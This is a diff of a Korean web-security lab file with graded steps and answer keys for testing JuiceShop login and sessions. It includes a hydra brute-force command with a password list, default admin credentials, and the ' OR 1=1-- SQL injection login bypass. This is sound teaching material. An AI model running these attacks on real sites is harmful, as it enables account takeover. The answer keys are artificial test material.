@@ -1,826 +1,529 @@
 lab_id: standalone-web-vuln-week04
-title: "인증/세션 관리 점검 — 약한 비밀번호 / 인증 우회 / 세션 고정 / 쿠키 속성 (6v6 + R/B/P)"
+title: "인증/세션 관리 점검 — 약한 PW / JWT / 쿠키 속성 / 세션 고정 / 인증 우회 (6v6 + R/B/P)"
 version: standalone-non-ai
 course: web-vuln
 week: 4
-description: 인증 메커니즘과 세션 관리의 취약점을 분석하고 공격과 방어를 실습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를
-  검증합니다.
+description: |
+  JuiceShop 의 /rest/user/login 을 인증·세션 측면 으로 점검. 약한 비밀번호 (default
+  credentials + brute force), JWT 구조 분석, 쿠키 속성 (HttpOnly/Secure/SameSite),
+  세션 고정, 인증 우회 1 패턴 (단순 SQLi — 본격 SQLi 는 W05 에서) 의 5 카테고리.
+
+  Red 의 brute force / 우회 시도 는 fw 의 forward log + Apache access.log + Wazuh
+  rule 5710 / 100002 가동. Blue 는 dashboard 에서 시간순 alert 확인 + 점검자 의
+  Red 활동 baseline 학습.
 difficulty: medium
 duration_minutes: 120
+audience: 웹 보안 입문자 (4주차)
+prerequisites:
+  - "W03 의 정찰 결과 — 인증 endpoint (/rest/user/login) + 등록 endpoint (/api/Users) 식별 완료"
+  - "attacker 컨테이너 에 curl / hydra / jq 가용 + jwt 분석 위한 base64 / python3 가용"
+  - "JuiceShop 의 default 자격증명 (admin@juice-sh.op / admin123) 의 *존재* 만 알고 있음 (직접 사용 X — 점검 결과 로 발견)"
 objectives:
-- 인증 취약점을 탐지한다
-- 세션 관리 취약점을 이해한다
-- 안전한 인증 구현을 학습한다
+  - "정상 로그인 (admin@juice-sh.op / admin123) 의 응답 JWT 구조 (header.payload.signature) 디코딩"
+  - "약한 비밀번호 wordlist 5~10 단어 로 admin 계정 brute force 시도 (성공/실패 응답 패턴 차이)"
+  - "Set-Cookie 헤더 의 HttpOnly / Secure / SameSite 속성 표 정리 + 결손 의 위험 분석"
+  - "세션 고정 시도 — 로그인 전후 session 토큰 비교 (regenerate 여부)"
+  - "인증 우회 1 패턴 (단순 ' OR 1=1-- 등) 시도 + 결과 (성공/실패 + 응답 패턴)"
+  - "Red/Blue/Purple — brute force burst 가 Wazuh rule 5710 (multiple failed login) 가동 → 점검자 의 자기 식별 가능성"
 pass_threshold: 0.6
 steps:
-- order: 1
-  instruction: '{{WEB_IP}} 대상으로 로그인 메커니즘 분석을(를) 수행하시오.
 
+  - order: 1
+    instruction: |
+      ## 🎯 MISSION — 정상 로그인 + JWT 구조 분석
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
-    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 로그인 메커니즘 분석 관련 도구와 기법을 활용하세요.
-  category: auth
-  points: 8
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 로그인 메커니즘 분석을(를) 수행해줘\n\U0001F4CE 참고 (CLI):\
-    \ curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
-    \ \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '로그인 메커니즘 분석 완료'"
-  answer_detail: 로그인 메커니즘 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect: 완료
-    field: stdout
-    semantic:
-      intent: 로그인 메커니즘 분석 — 로그인 엔드포인트·필드명·응답 코드·세션 쿠키 설정 파악
+      **어디서:** attacker 컨테이너
+      **무엇을:** JuiceShop 의 default 관리자 자격증명 으로 /rest/user/login 정상
+      로그인. 응답 JSON 의 `authentication.token` (JWT) 을 3 부분 (header /
+      payload / signature) 으로 분해 + Base64 디코딩.
+
+      ⚠️ default 자격증명: `admin@juice-sh.op` / `admin123` — JuiceShop 의 의도적
+      challenge. 본 lab 에서만 사용. 운영 환경 에서 이런 자격증명 은 점검 첫 finding.
+
+      **결과 어떻게 정리:**
+
+      | 부분 | Base64 (앞 20 자) | 디코딩 한 JSON | 학생 본인 의 1 줄 해석 |
+      |---|---|---|---|
+      | header | | | |
+      | payload | | | |
+      | signature | (서명 — 디코딩 X) | (none) | (RS256 의 RSA 서명 — 변조 시 검증 실패) |
+
+      ## 💡 왜 이걸 하는가?
+
+      JWT = OAuth/OIDC/대다수 SPA 의 인증 토큰. 구조 (header.payload.signature) +
+      알고리즘 (header 의 `alg`) + payload 의 claim (sub/exp/role) 을 직접 디코딩
+      해 보면 W11 의 *JWT 변조 공격* (alg=none / weak secret / key confusion) 의
+      이해 가 쉬워진다.
+
+      ## 🔵 Blue 측 관찰
+
+      정상 로그인 1 회 = web access.log 의 `POST /rest/user/login HTTP/1.1 200` +
+      Wazuh rule 100002 (web request) 1 line. *성공 응답* 이라 alert level 낮음.
+
+      ## 📋 채점 기준
+
+      - 정상 로그인 1 회 + JWT 받음
+      - 3 부분 분리 + header/payload 디코딩 결과 인용
+      - payload 의 알려진 claim (sub/iat/exp 등) 학생 본인 해석
+    hint: "POST /rest/user/login with JSON body `{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}`. 응답 JSON 의 .authentication.token. JWT 분해 = token.split('.') — base64url 디코딩 (Python: `base64.urlsafe_b64decode(part + '==' * 3)` 또는 `cut -d. -f2 | base64 -d`)."
+    category: auth
+    points: 12
+    answer: |
+      🤖 자기학습용 정답 가이드:
+      T=$(curl -s -X POST http://juice.6v6.lab/rest/user/login -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r '.authentication.token')
+      echo "$T" | head -c 80; echo
+      echo "$T" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
+      echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+    answer_detail: |
+      JuiceShop 의 JWT alg = RS256 (header). payload 에 .data.id + .data.role +
+      .iat + .exp. role=admin 변조 가능 여부 = W11 의 본격 점검 주제. base64url 의
+      padding 부족 시 `==` 추가.
+    verify:
+      intent: "정상 로그인 + JWT 3 부분 디코딩 + payload claim 해석"
       success_criteria:
-      - curl 로 정상/잘못된 자격증명 시도 후 응답 비교
-      - Set-Cookie 헤더에서 세션 쿠키명과 속성 확인
-      - 응답 본문 또는 상태 코드 차이 (타이밍 차이 포함) 기록
+        - "로그인 1 회 + token 수신"
+        - "header + payload 디코딩 결과 인용"
+        - "payload claim (sub/iat/exp/role 등) 학생 해석"
       acceptable_methods:
-      - curl -v -d username=test -d password=test <login>
-      - Burp Proxy + Repeater
-      - python requests session 로 쿠키 추적
-      - mitmproxy 로 요청 기록
+        - "curl + jq 또는 python3 (jwt 라이브러리 또는 base64 수동)"
+        - "JWT 구조 시각화 다양 (표 / json block / 등)"
       negative_signs:
-      - 단일 시도만
-      - 쿠키/응답 분석 없음
-      - 타이밍 차이 언급 없음
-  target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '로그인 메커니즘\
-    \ 분석 완료'"
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 로그인 메커니즘 분석을(를) 수행해줘
+        - "로그인 실패 (자격증명 오타)"
+        - "디코딩 안 한 token paste 만"
+        - "payload claim 해석 없음"
+    target_vm: attacker
+    risk_level: low
 
+  - order: 2
+    instruction: |
+      ## 🎯 MISSION — 약한 비밀번호 brute force (hydra) — 5~10 단어 wordlist
 
-    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
-    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
-- order: 2
-  instruction: '{{WEB_IP}} 대상으로 브루트포스 공격 시뮬레이션을(를) 수행하시오.
+      **어디서:** attacker 컨테이너
+      **무엇을:** hydra 의 http-post-form 으로 admin@juice-sh.op 계정 에 5~10
+      단어 wordlist (admin / admin123 / password / qwerty / 123456 / letmein 등)
+      brute force. 결과 의 성공 응답 패턴 식별.
 
+      ⚠️ **시간 + scope 제한**: 1 사용자 + 10 단어 wordlist 만. 운영 환경 brute
+      force = lockout 정책 / IP 차단 우려 — lab 환경 의 의도적 학습.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
-    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 브루트포스 공격 시뮬레이션 관련 도구와 기법을 활용하세요.
-  category: auth
-  points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 브루트포스 공격 시뮬레이션을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '브루트포스 공격\
-    \ 시뮬레이션 완료'"
-  answer_detail: 브루트포스 공격 시뮬레이션은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect: 완료
-    field: stdout
-    semantic:
-      intent: 브루트포스 시뮬레이션 — 계정 잠금·Rate Limit 검증 (hydra/medusa 또는 수동 반복)
+      **결과 어떻게 정리:**
+
+      ```
+      hydra 명령: <학생 작성 한 명령 한 줄>
+
+      시도한 비밀번호 (10 단어): admin, admin123, password, qwerty, 123456, letmein, ...
+
+      결과: 어느 비밀번호 가 성공 했나? → <비밀번호>
+      성공 응답 패턴: <응답 body 의 어떤 string 으로 success 판별?>
+
+      실패 응답 패턴: <응답 body 의 어떤 string 으로 fail 판별?>
+
+      학생 1 문장 해석: 약한 비밀번호 의 위험 + lockout 정책 의 필요성
+      ```
+
+      ## 💡 왜 이걸 하는가?
+
+      brute force = 가장 단순 한 공격 이지만 약한 비밀번호 정책 + 미흡 한 lockout
+      이 결합 하면 admin 계정 완전 탈취. 점검 의 핵심 finding 중 하나. hydra 의
+      http-post-form 사용법 = 다른 폼 기반 인증 (W04 의 다른 시나리오 + 운영 환경
+      brute force) 의 base.
+
+      ## 🔵 Blue 측 관찰
+
+      hydra 의 burst = web access.log 의 10 회 POST /rest/user/login. Wazuh rule
+      5710 (multiple failed login attempts) 가동 가능. ModSecurity 의 rate-limit
+      룰 도 동작 시 일부 요청 403 차단. *점검자 의 brute force 흔적* 의 baseline.
+
+      ## 📋 채점 기준
+
+      - hydra 명령 1 회 실행 (10 단어 wordlist)
+      - 성공/실패 응답 패턴 식별
+      - 학생 본인 의 위험 해석 1 문장
+    hint: "hydra 의 http-post-form syntax: `hydra -l email -P wordlist.txt URL http-post-form '/path:body:F=fail_string'`. JuiceShop 의 로그인 응답 = JSON. 실패 시 `Invalid email or password.` 메시지 — 이를 `F=` 의 fail string 으로."
+    category: auth
+    points: 14
+    answer: |
+      🤖 자기학습용 정답 가이드:
+      cat > /tmp/pw.txt <<EOF
+      admin
+      admin123
+      password
+      qwerty
+      123456
+      letmein
+      Password1
+      admin@123
+      P@ssw0rd
+      changeme
+      EOF
+      hydra -l 'admin@juice-sh.op' -P /tmp/pw.txt \
+        juice.6v6.lab http-post-form \
+        '/rest/user/login:{"email":"^USER^","password":"^PASS^"}:Invalid' \
+        -V 2>&1 | tail -10
+    answer_detail: |
+      hydra http-post-form 의 colon 분리: `path:body:fail_str`. JuiceShop 의 로그인 실패
+      응답 body 에 `Invalid email or password.` — fail string 으로 사용. body 가 JSON
+      이므로 Content-Type 자동 application/json 으로 보내짐 (hydra 의 default).
+      성공 시 hydra 출력 의 `[80][http-post-form] host: ... login: ... password: ...`.
+    verify:
+      intent: "hydra 1 회 + 성공/실패 응답 패턴 식별 + 약한 PW 위험 해석"
       success_criteria:
-      - 최소 10회 반복 시도 후 응답 코드·본문 변화
-      - Rate Limiting 또는 계정 잠금 여부 판정
-      - 429 또는 Retry-After 헤더 해석
+        - "hydra 명령 실행 + 결과"
+        - "성공 한 비밀번호 식별"
+        - "실패 응답 의 fail_string 명시"
+        - "위험 해석 1 문장"
       acceptable_methods:
-      - hydra -l <user> -P wordlist.txt <url>
-      - for i in 1..20; do curl ...; done
-      - Burp Intruder sniper 모드
-      - medusa -h <host> -U users.txt -P passes.txt
+        - "hydra http-post-form 또는 학생 본인 의 python 스크립트"
+        - "wordlist 5~10 단어 (admin123 포함 필수)"
       negative_signs:
-      - 단일 시도로 판정
-      - Rate Limit 해석 없음
-      - 429/계정 잠금 언급 없음
-  target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '브루트포스 공격\
-    \ 시뮬레이션 완료'"
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 브루트포스 공격 시뮬레이션을(를) 수행해줘
+        - "wordlist 100+ 단어 (운영 환경 brute force 패턴)"
+        - "성공 패턴 식별 없이 출력 paste"
+        - "위험 해석 누락"
+    target_vm: attacker
+    risk_level: medium
 
+  - order: 3
+    instruction: |
+      ## 🎯 MISSION — Set-Cookie 헤더 의 HttpOnly / Secure / SameSite 속성 표 정리
 
-    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
-    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
-- order: 3
-  instruction: '{{WEB_IP}} 대상으로 패스워드 정책 검증을(를) 수행하시오.
+      **어디서:** attacker 컨테이너
+      **무엇을:** JuiceShop 의 응답 헤더 의 모든 `Set-Cookie` 라인 의 3 속성
+      (HttpOnly / Secure / SameSite) 의 *존재 여부* 표 + 각 속성 결손 의 위험.
 
+      **결과 어떻게 정리:**
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
-    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 패스워드 정책 검증 관련 도구와 기법을 활용하세요.
-  category: auth
-  points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 패스워드 정책 검증을(를) 수행해줘\n\U0001F4CE 참고 (CLI):\
-    \ curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
-    \ \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 정책 검증 완료'"
-  answer_detail: 패스워드 정책 검증은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect:
-    - 완료
-    - web_scan
-    - 10.20.32.80
-    field: stdout
-    semantic:
-      intent: 패스워드 정책 검증 — 짧은/공용/약한 패스워드 허용 여부, haveibeenpwned API 등 유출 이력 체크
+      | 쿠키 이름 | HttpOnly | Secure | SameSite | 결손 의 위험 (학생 본인 1 줄) |
+      |---|---|---|---|---|
+      | (cookie 1) | ✓/✗ | ✓/✗ | ✓/✗/Lax/Strict/None | |
+      | (cookie 2) | | | | |
+
+      ## 💡 왜 이걸 하는가?
+
+      - **HttpOnly 결손**: JS document.cookie 로 토큰 탈취 가능 → XSS 와 결합 시 세션 hijack
+      - **Secure 결손**: HTTP (비 TLS) 채널 로 쿠키 전송 → MITM 시 평문 캡처
+      - **SameSite 결손 또는 None**: CSRF 공격 가능 (W06 의 본격 주제)
+
+      운영 환경 인증 점검 의 단골 finding. OWASP A07 Identification and Authentication Failures.
+
+      ## 🔵 Blue 측 관찰
+
+      쿠키 속성 자체 는 application-level 결함 — Blue 의 IDS / WAF 로 detection 불가.
+      Purple 의 코드 리뷰 / config 검토 의 영역.
+
+      ## 📋 채점 기준
+
+      - 모든 Set-Cookie 헤더 추출
+      - 3 속성 의 존재 여부 표
+      - 결손 시 위험 학생 본인 1 줄
+    hint: "curl -sI http://juice.6v6.lab/ 만 으로 일부 Set-Cookie. 로그인 후 응답 (curl -X POST + -c cookie.txt) 의 헤더 도 함께 보면 모든 쿠키. 학생 본인 의 grep / awk 로 추출."
+    category: auth
+    points: 10
+    answer: |
+      🤖 자기학습용 정답 가이드:
+      curl -sI http://juice.6v6.lab/ | grep -i '^set-cookie' | head -5
+      curl -sI -X POST http://juice.6v6.lab/rest/user/login \
+        -H 'Content-Type: application/json' \
+        -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
+        | grep -i '^set-cookie' | head -5
+    answer_detail: |
+      JuiceShop 응답 의 일반적 쿠키: `language` (locale), `welcomebanner_status` (UI),
+      `cookieconsent_status` (GDPR). 인증 토큰 자체 는 *body 의 JWT* — 쿠키 X.
+      그러나 SPA 에서 쿠키 + JWT 혼용 운영 환경 도 다수. 학생 의 분석 = "JWT 가
+      JS localStorage 에 저장 되면 XSS 시 같은 위험" 도 연결 가능.
+    verify:
+      intent: "Set-Cookie 의 3 속성 표 정리 + 결손 위험 해석"
       success_criteria:
-      - 최소 3가지 약한 패스워드(1234/password/admin) 시도
-      - 정책(최소 길이·복잡도·유출 차단) 미비점 식별
-      - NIST SP 800-63B 권고 언급
+        - "모든 Set-Cookie 추출"
+        - "3 속성 표"
+        - "결손 위험 해석 (학생 본인 단어)"
       acceptable_methods:
-      - API 회원가입/변경으로 테스트 비밀번호 시도
-      - haveibeenpwned API 조회
-      - zxcvbn 복잡도 추정
-      - OWASP ASVS v4 V2 참조
+        - "curl -I / -sI 또는 -v"
+        - "헤더 추출 form 자유 (grep / awk / python)"
       negative_signs:
-      - 단일 패스워드만 테스트
-      - 유출 이력 체크 없음
-      - 표준 기준 없이 주관 평가
-  target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '패스워드 정책\
-    \ 검증 완료'"
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 패스워드 정책 검증을(를) 수행해줘
+        - "쿠키 1 개 만"
+        - "속성 표 없이 paste"
+        - "결손 위험 누락"
+    target_vm: attacker
+    risk_level: low
 
+  - order: 4
+    instruction: |
+      ## 🎯 MISSION — 세션 고정 (Session Fixation) 시도
 
-    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
-    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
-- order: 4
-  instruction: '{{WEB_IP}} 대상으로 세션 토큰 엔트로피 분석을(를) 수행하시오.
+      **어디서:** attacker 컨테이너
+      **무엇을:** 로그인 전 과 후 의 session 토큰 비교 — 로그인 후 token 이 새로
+      *발급* 되면 세션 고정 안전, *그대로 유지* 되면 취약. JWT 기반 SPA 에서는
+      "로그인 전 토큰 자체 가 존재 안 함" 이 표준 — 학생 이 직접 확인.
 
+      **결과 어떻게 정리:**
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `session` 에 적합한 도구: curl -c cookie.jar -b cookie.jar,
-    jwt_tool. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 세션 토큰 엔트로피 분석 관련 도구와 기법을 활용하세요.
-  category: session
-  points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 세션 토큰 엔트로피 분석을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 토큰 엔트로피\
-    \ 분석 완료'"
-  answer_detail: 세션 토큰 엔트로피 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect: 완료
-    field: stdout
-    semantic:
-      intent: 세션 토큰 엔트로피 분석 — 여러 토큰 수집 후 길이·charset·변이 관찰, Burp Sequencer 로 랜덤성 검증
+      ```
+      1. 로그인 전: GET / 응답 의 Set-Cookie 또는 body 토큰 — <있음/없음 + 토큰 일부>
+      2. 로그인 후: POST /rest/user/login 응답 의 token — <token 일부>
+      3. 두 토큰 비교: <같음/다름/로그인 전 토큰 없음>
+      4. 세션 고정 위험: <안전/취약/JWT 의 무 세션 stateless 패턴>
+      5. 학생 분석: <1 문장 — JuiceShop 의 인증 구조 가 세션 고정 에 안전한 이유 또는 위험>
+      ```
+
+      ## 💡 왜 이걸 하는가?
+
+      세션 고정 = 공격자 가 사전 에 알려 진 session ID 를 피해자 에게 강제 후 피해자
+      로그인 → 공격자 가 같은 session ID 로 인증 된 상태 접근. session ID 가
+      로그인 시 regenerate 되면 안전. JWT 의 stateless 모델 은 구조 자체 가
+      안전 하나, "로그인 전 anonymous session" 이 있는 운영 환경 에서는 여전히 위험.
+
+      ## 🔵 Blue 측 관찰
+
+      세션 고정 시도 = 정상 GET + POST 시퀀스. Blue 의 IDS / WAF 로 detection 불가
+      — application-level + 시계열 분석 필요.
+
+      ## 📋 채점 기준
+
+      - 로그인 전/후 token 비교 결과
+      - 세션 고정 위험 판정 (안전/취약/N/A)
+      - 학생 본인 1 문장 해석
+    hint: "curl -c /tmp/before.txt http://juice.6v6.lab/ 로 로그인 전 cookie 저장. 로그인 후 -b /tmp/before.txt 로 같은 cookie 보내며 token 비교."
+    category: auth
+    points: 10
+    answer: |
+      🤖 자기학습용 정답 가이드:
+      curl -c /tmp/before.txt -s http://juice.6v6.lab/ -o /dev/null
+      cat /tmp/before.txt | head -5
+      T1=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
+        -b /tmp/before.txt -c /tmp/after.txt \
+        -H 'Content-Type: application/json' \
+        -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r '.authentication.token')
+      echo "after token first 30: $(echo $T1 | head -c 30)"
+      diff /tmp/before.txt /tmp/after.txt 2>&1 | head -5
+    answer_detail: |
+      JuiceShop 의 anonymous session = `language` / `welcomebanner_status` 등 비 인증 쿠키 만.
+      인증 토큰 (JWT) 은 body 로 전달 — stateless. *로그인 전 토큰 없음* 이 표준.
+      세션 고정 의 risk 0 (구조적). 단 운영 환경 의 PHP / Java session 기반 앱 은 다름.
+    verify:
+      intent: "로그인 전/후 token 비교 + 세션 고정 위험 판정 + 학생 해석"
       success_criteria:
-      - 최소 5개 세션 토큰 수집
-      - 길이·charset(hex/base64) 일관성 확인
-      - 추측 가능성(증가형 vs 랜덤) 판정
+        - "로그인 전/후 token 모두 수집"
+        - "비교 결과 (같음/다름/없음)"
+        - "위험 판정 + 학생 1 문장"
       acceptable_methods:
-      - repeat curl -c cookies.txt login 으로 토큰 여러 개 생성
-      - Burp Sequencer 자동 랜덤성 분석
-      - python으로 엔트로피 계산 (math.log2 * len)
-      - dieharder/ent 통계 테스트
+        - "curl -c -b cookie jar 또는 직접 token 비교"
+        - "JWT 의 anonymous 부재 분석 도 정답"
       negative_signs:
-      - 단일 토큰만 관찰
-      - 랜덤성 평가 없음
-      - 예측 가능성 판정 없음
-  target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 토큰 엔트로피\
-    \ 분석 완료'"
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 세션 토큰 엔트로피 분석을(를) 수행해줘
+        - "1 token 만 수집"
+        - "비교 없이 token paste"
+        - "위험 판정 없음"
+    target_vm: attacker
+    risk_level: low
 
+  - order: 5
+    instruction: |
+      ## 🎯 MISSION — 인증 우회 1 패턴 (단순 SQLi — ' OR 1=1--) 시도
 
-    [도구 권장] session: curl -c cookie.jar -b cookie.jar, jwt_tool. curl 만 쓰지 말고 **curl
-    -c cookie.jar -b cookie.jar** 등 적합 도구로 호출 후 stdout quote.'
-- order: 5
-  instruction: '{{WEB_IP}} 대상으로 세션 고정 공격 테스트을(를) 수행하시오.
+      **어디서:** attacker 컨테이너
+      **무엇을:** /rest/user/login 의 email 필드 에 `' OR 1=1--` payload 1 회 시도
+      + 응답 분석. **본격 SQLi 는 W05 — 여기서는 *인증 우회* 의 한 사례 로 1 패턴
+      만**.
 
+      ⚠️ 이 step 의 의도 = SQLi 가 *인증 우회 의 가장 빠른 방법* 인 점 의 학습.
+      성공/실패 두 경우 모두 학습 가치.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `session` 에 적합한 도구: curl -c cookie.jar -b cookie.jar,
-    jwt_tool. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 세션 고정 공격 테스트 관련 도구와 기법을 활용하세요.
-  category: session
-  points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 세션 고정 공격 테스트을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 고정 공격\
-    \ 테스트 완료'"
-  answer_detail: 세션 고정 공격 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect: 완료
-    field: stdout
-    semantic:
-      intent: 세션 고정(Session Fixation) — 로그인 전 제공한 세션 ID 가 로그인 후에도 유지되는지 검증 (재생성 안하면
-        취약)
+      **결과 어떻게 정리:**
+
+      ```
+      1. payload: email='\\' OR 1=1--', password='anything'
+      2. 응답 코드: <200 / 401 / 403 / 500>
+      3. 응답 body 처음 1~3 줄: <인용>
+      4. 인증 우회 성공? <yes/no/error>
+      5. 학생 1 문장 분석: 왜 성공 (또는 실패)? — JuiceShop 의 backend (SQLite + Sequelize) 의 query 처리 방식
+      ```
+
+      ## 💡 왜 이걸 하는가?
+
+      `' OR 1=1--` = 가장 유명한 SQLi 우회 payload. 이게 막혀 있으면 *입력 검증
+      이 일부 가동* 또는 *ORM 의 prepared statement* 사용 의 단서. JuiceShop 의
+      backend Sequelize ORM 은 일부 query 가 prepared, 일부 raw — 결과 가 endpoint
+      마다 다름.
+
+      ## 🔵 Blue 측 관찰
+
+      `'` (작은따옴표) 입력 = ModSecurity CRS 942100 (SQL injection) 룰 가동 가능.
+      JuiceShop 의 web 컨테이너 의 ModSec audit log 확인 (W05 의 본격 주제 — 여기서는 *룰 가동 여부* 만).
+
+      ## 📋 채점 기준
+
+      - payload 1 회 시도 + 응답 인용
+      - 인증 우회 성공/실패 판정
+      - 학생 본인 분석 1 문장 (success/failure 원인 추정)
+    hint: "JSON body 에 작은따옴표 + 백슬래시 escape 필요 — `-d '{\"email\":\"x'\\'' OR 1=1--\",\"password\":\"y\"}'` 또는 별도 file 로 전송."
+    category: auth
+    points: 12
+    answer: |
+      🤖 자기학습용 정답 가이드:
+      cat > /tmp/sqli.json <<'EOF'
+      {"email":"' OR 1=1--","password":"anything"}
+      EOF
+      curl -s -X POST http://juice.6v6.lab/rest/user/login \
+        -H 'Content-Type: application/json' \
+        --data @/tmp/sqli.json -w '\nHTTP: %{http_code}\n' | head -c 400
+    answer_detail: |
+      JuiceShop 의 /rest/user/login 은 Sequelize ORM 사용 하지만 *raw query* 패턴 으로
+      구현 — `' OR 1=1--` 가 첫 user (= admin) 반환 → 인증 우회 성공. 이게 JuiceShop
+      의 의도적 challenge "Login Admin" — W05 의 본격 SQLi 의 일부.
+    verify:
+      intent: "단순 SQLi 우회 1 회 + 응답 분석 + 성공/실패 판정 + 학생 1 문장"
       success_criteria:
-      - 미인증 상태 세션 쿠키 획득
-      - 해당 쿠키 지참 로그인 후 세션 ID 변경 여부 확인
-      - 변경되지 않으면 Session Fixation 취약 판정
+        - "payload 1 회 시도 + 응답 인용"
+        - "성공/실패 판정 (응답 코드 + body 의 token 존재 여부)"
+        - "학생 분석 1 문장"
       acceptable_methods:
-      - curl -c cookies.txt <login_page> 후 -b cookies.txt 로 로그인
-      - Burp Repeater 로 쿠키 비교
-      - python requests session 으로 로그인 전후 비교
-      - OWASP Testing Guide WSTG-SESS-03 참조
+        - "curl --data @file 또는 -d 직접"
+        - "응답 200 + token = 성공, 401 = 실패"
       negative_signs:
-      - 쿠키 비교 없음
-      - 로그인 전후 동일 여부 판정 누락
-      - 세션 재생성 권고 없음
-  target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '세션 고정 공격\
-    \ 테스트 완료'"
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 세션 고정 공격 테스트을(를) 수행해줘
+        - "payload 없이 추상적 설명"
+        - "응답 인용 없음"
+        - "성공/실패 판정 없음"
+    target_vm: attacker
+    risk_level: medium
 
+  - order: 6
+    instruction: |
+      ## 🎯 MISSION — 인증 결함 보고서 markdown (5 finding 통합)
 
-    [도구 권장] session: curl -c cookie.jar -b cookie.jar, jwt_tool. curl 만 쓰지 말고 **curl
-    -c cookie.jar -b cookie.jar** 등 적합 도구로 호출 후 stdout quote.'
-- order: 6
-  instruction: '{{WEB_IP}} 대상으로 세션 하이재킹 시뮬레이션을(를) 수행하시오.
+      **어디서:** 학생 PC 보고서
+      **무엇을:** STEP 1~5 의 결과 를 *인증 결함 보고서* 1 markdown 으로 통합.
+      운영 환경 의 점검 보고서 format 의 simplified version.
 
+      **markdown 구조:**
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `session` 에 적합한 도구: curl -c cookie.jar -b cookie.jar,
